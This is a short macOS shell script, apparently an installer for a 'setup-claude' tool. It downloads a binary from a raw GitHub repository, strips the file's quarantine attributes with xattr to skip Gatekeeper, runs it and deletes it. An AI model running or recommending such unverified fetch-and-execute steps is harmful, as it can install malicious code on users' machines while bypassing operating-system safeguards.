#!/bin/sh
set -e

ARCH=$(uname -m)
BASE_URL="https://raw.githubusercontent.com/x-saola/litellm-ultis/main/cli-dist"

if [ "$ARCH" = "arm64" ]; then
  BIN_NAME="setup-claude-macos-arm64"
else
  BIN_NAME="setup-claude-macos-x64"
fi

TMP_BIN=$(mktemp)
echo "Downloading $BIN_NAME..."
curl -fsSL "$BASE_URL/$BIN_NAME" -o "$TMP_BIN"

xattr -cr "$TMP_BIN" 2>/dev/null || xattr -c "$TMP_BIN" 2>/dev/null || true
chmod +x "$TMP_BIN"
"$TMP_BIN"
rm -f "$TMP_BIN"
